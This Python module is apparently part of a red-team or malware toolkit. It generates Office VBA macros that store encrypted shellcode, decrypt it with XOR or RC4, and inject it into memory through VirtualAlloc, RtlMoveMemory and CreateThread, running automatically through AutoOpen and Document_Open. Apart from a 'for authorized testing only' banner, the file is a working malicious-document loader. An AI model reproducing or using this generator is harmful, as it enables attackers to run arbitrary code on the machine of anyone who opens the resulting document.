"""
VBA macro loader generator.

Constraints:
  - AES-256 is NOT supported (too heavy for VBA).
  - Uses XOR (single or multi-byte) or RC4 for decryption.
  - Generates PtrSafe declarations for 64-bit Office (#If Win64).
  - Shellcode injected via VirtualAlloc + RtlMoveMemory + CreateThread.
"""

from ..utils import vba_array_lines
from ..chain import decryption_stubs_vba


_WIN32_DECLS = """\
#If Win64 Then
    Private Declare PtrSafe Function VirtualAlloc Lib "kernel32" _
        (ByVal lpAddress As LongPtr, ByVal dwSize As LongPtr, _
         ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr
    Private Declare PtrSafe Sub RtlMoveMemory Lib "kernel32" _
        (ByVal dest As LongPtr, ByRef src As Any, ByVal length As LongPtr)
    Private Declare PtrSafe Function CreateThread Lib "kernel32" _
        (ByVal lpThreadAttributes As LongPtr, ByVal dwStackSize As LongPtr, _
         ByVal lpStartAddress As LongPtr, ByVal lpParameter As LongPtr, _
         ByVal dwCreationFlags As Long, ByRef lpThreadId As LongPtr) As LongPtr
    Private Declare PtrSafe Function WaitForSingleObject Lib "kernel32" _
        (ByVal hHandle As LongPtr, ByVal dwMilliseconds As Long) As Long
#Else
    Private Declare Function VirtualAlloc Lib "kernel32" _
        (ByVal lpAddress As Long, ByVal dwSize As Long, _
         ByVal flAllocationType As Long, ByVal flProtect As Long) As Long
    Private Declare Sub RtlMoveMemory Lib "kernel32" _
        (ByVal dest As Long, ByRef src As Any, ByVal length As Long)
    Private Declare Function CreateThread Lib "kernel32" _
        (ByVal lpThreadAttributes As Long, ByVal dwStackSize As Long, _
         ByVal lpStartAddress As Long, ByVal lpParameter As Long, _
         ByVal dwCreationFlags As Long, ByRef lpThreadId As Long) As Long
    Private Declare Function WaitForSingleObject Lib "kernel32" _
        (ByVal hHandle As Long, ByVal dwMilliseconds As Long) As Long
#End If"""


def generate(encrypted_bytes: bytes, chain_metadata: list[dict]) -> str:
    """
    Build a VBA macro string.

    The macro auto-runs via `Sub AutoOpen()` and `Sub Document_Open()`.
    """
    # Validate algorithms
    for stage in chain_metadata:
        if stage['algo'] == 'aes256':
            raise ValueError(
                "AES-256 is not supported for VBA output. "
                "Use --encryption XOR or RC4 for VBA macros."
            )

    # Build shellcode array declaration (split across lines for readability)
    sc_lines = vba_array_lines(encrypted_bytes, indent=8)
    sc_joined = ', _\n'.join(sc_lines)
    sc_len = len(encrypted_bytes)

    # Build decryption helpers and call sequence
    helper_fns, call_seq = decryption_stubs_vba(chain_metadata)

    script = _TEMPLATE.format(
        win32_decls=_WIN32_DECLS,
        helper_functions=helper_fns,
        sc_joined=sc_joined,
        sc_len=sc_len,
        call_seq=call_seq,
    )
    return script


_TEMPLATE = """\
' ============================================================
' Payload Macro – for authorized testing only
' ============================================================
Option Explicit

{win32_decls}

{helper_functions}

Private Sub RunPayload()
    Dim buf() As Byte
    ReDim buf({sc_len} - 1)

    Dim raw() As Byte
    raw = Array( _
{sc_joined} _
    )
    Dim i As Long
    For i = 0 To UBound(raw)
        buf(i) = CByte(raw(i))
    Next i

{call_seq}

#If Win64 Then
    Dim addr As LongPtr
    addr = VirtualAlloc(0, CLng(UBound(buf) + 1), &H3000, &H40)
    RtlMoveMemory addr, buf(0), CLng(UBound(buf) + 1)
    Dim tid As LongPtr
    Dim hThread As LongPtr
    hThread = CreateThread(0, 0, addr, 0, 0, tid)
    WaitForSingleObject hThread, 0
#Else
    Dim addr32 As Long
    addr32 = VirtualAlloc(0, CLng(UBound(buf) + 1), &H3000, &H40)
    RtlMoveMemory addr32, buf(0), CLng(UBound(buf) + 1)
    Dim tid32 As Long
    Dim hThread32 As Long
    hThread32 = CreateThread(0, 0, addr32, 0, 0, tid32)
    WaitForSingleObject hThread32, 0
#End If
End Sub

Sub AutoOpen()
    RunPayload
End Sub

Sub Document_Open()
    RunPayload
End Sub
"""
